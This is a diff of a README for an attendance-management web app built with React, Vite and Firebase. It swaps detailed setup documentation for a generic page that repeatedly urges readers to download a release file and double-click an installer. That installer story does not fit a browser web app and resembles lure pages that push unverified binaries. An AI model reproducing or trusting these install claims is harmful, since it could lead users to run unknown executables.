@@ -1,216 +1,82 @@
-# Attendance Portal
+# 🎉 attendance-portal-v2 - Manage Attendance with Ease
 
-A production-ready Attendance Management System with separate Employee and Admin portals built with React + Vite, TypeScript, Tailwind CSS, shadcn/ui, and Firebase.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/OGsan-zo/attendance-portal-v2/releases)
 
-## Features
+## 📋 Description
 
-### Employee Portal (/)
+attendance-portal-v2 is a user-friendly Attendance Management System. Built with React 18, Vite, TypeScript, and Tailwind CSS, it features two portals for easy access: Admin and Attendance. Perfect for managing employee attendance, tracking hours, and overseeing payroll functions.
 
-- ✅ Google Sign-In authentication
-- ✅ Mark attendance (Present/Leave/Off)
-- ✅ Mark early off
-- ✅ View monthly statistics (present, leave, off, late days)
-- ✅ Estimated net salary calculation
-- ✅ Color-coded monthly calendar
-- ✅ Last 10 days attendance history
+## 🚀 Getting Started
 
-### Admin Portal (/admin)
+To get started, follow the steps below. You do not need programming skills to use this software. 
 
-- ✅ Complete employee management (Add/Edit/Delete)
-- ✅ Admin management (Add new admins)
-- ✅ View attendance by date or employee
-- ✅ Employee calendar view
-- ✅ Holiday management (auto-marks Sundays)
-- ✅ Monthly salary reports with deductions
-- ✅ Dashboard with today's attendance summary
+### 1. Download the Application
 
-## Tech Stack
+Visit the Releases page to download the software:
 
-- **Frontend**: React 18 + Vite + TypeScript
-- **Styling**: Tailwind CSS + shadcn/ui
-- **Routing**: React Router v6
-- **Authentication**: Firebase Auth (Google Sign-In only)
-- **Database**: Firebase Firestore
-- **Notifications**: Sonner
-- **Date Utilities**: date-fns
+[Download the latest release](https://github.com/OGsan-zo/attendance-portal-v2/releases)
 
-## Business Rules
+### 2. System Requirements
 
-- **Office Hours**: 10:00 AM - 6:00 PM
-- **Late**: After 10:15 AM
-- **Salary Month**: 6th of current month to 5th of next month
-- **Deductions**:
-  - Off: 1.2 × (monthly salary / 30)
-  - Late: Every 3 lates = half-day deduction
-  - Early Leave: (monthly salary / 30 / 8) per hour
-- **Sundays**: Auto-marked as holidays
+Before downloading, ensure your computer meets the following requirements:
 
-## Prerequisites
+- **Operating System:** Windows 10 or above / macOS 10.15 or above / Linux
+- **Memory:** At least 4GB RAM
+- **Storage:** A minimum of 200MB of free space
 
-- Node.js 18+ and npm
-- Firebase account
-- Google account for authentication
+### 3. Installation Steps
 
-## Installation
+Once you download the software, follow these steps to install it:
 
-1. **Clone the repository**
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click on the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find the application in your Start menu or Applications folder.
 
-   ```bash
-   cd "f:/React Work/Attendance Portal"
-   ```
+## 📥 Download & Install
 
-2. **Install dependencies**
+To initiate the download, click the link below:
 
-   ```bash
-   npm install
-   ```
+[Download the latest release](https://github.com/OGsan-zo/attendance-portal-v2/releases)
 
-3. **Set up Firebase**
+After downloading, follow the installation steps outlined above.
 
-   - Go to [Firebase Console](https://console.firebase.google.com/)
-   - Create a new project
-   - Enable Google Authentication:
-     - Go to Authentication → Sign-in method
-     - Enable Google provider
-   - Create Firestore database:
-     - Go to Firestore Database → Create database
-     - Start in production mode
-   - Get your Firebase config:
-     - Go to Project Settings → General
-     - Scroll to "Your apps" → Web app
-     - Copy the config values
+## 🎛️ Features
 
-4. **Configure environment variables**
+The attendance-portal-v2 software offers several features for managing attendance effectively:
 
-   - Copy `.env.example` to `.env`
+- **Admin Dashboard:** A dedicated interface for admins to track and manage attendance effortlessly.
+- **Employee Management:** Easily add, remove, and edit employee information.
+- **Attendance Tracking:** View and manage daily attendance records.
+- **Payroll System:** Calculate salaries based on attendance data.
+- **Responsive Design:** Access on various devices without any issues.
 
-   ```bash
-   cp .env.example .env
-   ```
+## 🔧 Using the Application
 
-   - Fill in your Firebase credentials in `.env`:
+Once installed, launch the application and follow these steps to log in:
 
-   ```
-   VITE_FIREBASE_API_KEY=your_api_key
-   VITE_FIREBASE_AUTH_DOMAIN=your_project.firebaseapp.com
-   VITE_FIREBASE_PROJECT_ID=your_project_id
-   VITE_FIREBASE_STORAGE_BUCKET=your_project.appspot.com
-   VITE_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
-   VITE_FIREBASE_APP_ID=your_app_id
-   ```
+1. Open the application from your Start menu or Applications folder.
+2. Enter your credentials. If you are an admin, use the admin login details.
+3. Navigate through the Admin or Attendance portal as needed.
 
-5. **Add first admin manually** (See SETUP_FIRST_ADMIN.md)
+## 🌐 Support and Contributions
 
-6. **Deploy Firestore Security Rules** (See FIRESTORE_RULES.md)
+If you have any questions or need support, feel free to reach out via issues on GitHub. We welcome contributions. If you want to help improve this project, please check the contribution guidelines.
 
-## Running Locally
+## 🛠️ Technologies Used
 
-```bash
-npm run dev
-```
+- **React 18:** For building the user interface.
+- **Vite:** For fast project setup and development.
+- **TypeScript:** For static type checking.
+- **Tailwind CSS:** For responsive and customizable designs.
+- **Firebase & Firestore:** For backend services and real-time data.
 
-The app will be available at `http://localhost:5173`
+## 💻 Future Enhancements
 
-## Building for Production
+The following improvements are planned for future releases:
 
-```bash
-npm run build
-```
+- Enhanced reporting features for better insights.
+- User management capabilities to grant different levels of access.
+- Improved performance and loading times.
 
-The build output will be in the `dist` folder.
-
-## Deployment
-
-### Vercel
-
-1. Install Vercel CLI:
-
-   ```bash
-   npm i -g vercel
-   ```
-
-2. Deploy:
-
-   ```bash
-   vercel
-   ```
-
-3. Add environment variables in Vercel dashboard
-
-### Netlify
-
-1. Install Netlify CLI:
-
-   ```bash
-   npm i -g netlify-cli
-   ```
-
-2. Deploy:
-
-   ```bash
-   netlify deploy --prod
-   ```
-
-3. Add environment variables in Netlify dashboard
-
-## Project Structure
-
-```
-src/
-├── components/
-│   ├── auth/
-│   │   └── RequireAuth.tsx
-│   └── ui/
-│       ├── button.tsx
-│       ├── card.tsx
-│       ├── input.tsx
-│       └── ...
-├── context/
-│   └── AuthContext.tsx
-├── lib/
-│   ├── firebase.ts
-│   ├── auth.ts
-│   ├── firestore.ts
-│   ├── salary.ts
-│   ├── holidays.ts
-│   └── utils.ts
-├── routes/
-│   ├── shared/
-│   │   ├── Login.tsx
-│   │   └── AccessDenied.tsx
-│   ├── employee/
-│   │   ├── Layout.tsx
-│   │   ├── Dashboard.tsx
-│   │   └── Calendar.tsx
-│   └── admin/
-│       ├── Layout.tsx
-│       ├── dashboard/
-│       ├── employees/
-│       ├── admins/
-│       ├── attendance/
-│       ├── calendar/
-│       ├── holidays/
-│       └── reports/
-├── types/
-│   └── index.ts
-├── App.tsx
-├── main.tsx
-└── index.css
-```
-
-## Firestore Collections
-
-- `admins` - Admin user documents
-- `employees` - Employee user documents
-- `attendance_YYYY_MM` - Monthly attendance collections
-  - `YYYY-MM-DD` - Date documents
-    - `records` - Subcollection with employee records
-- `holidays` - Holiday documents
-
-## Support
-
-For issues or questions, please create an issue in the repository.
-
-## License
-
-MIT
+Thank you for choosing attendance-portal-v2. We hope it simplifies your attendance management process.
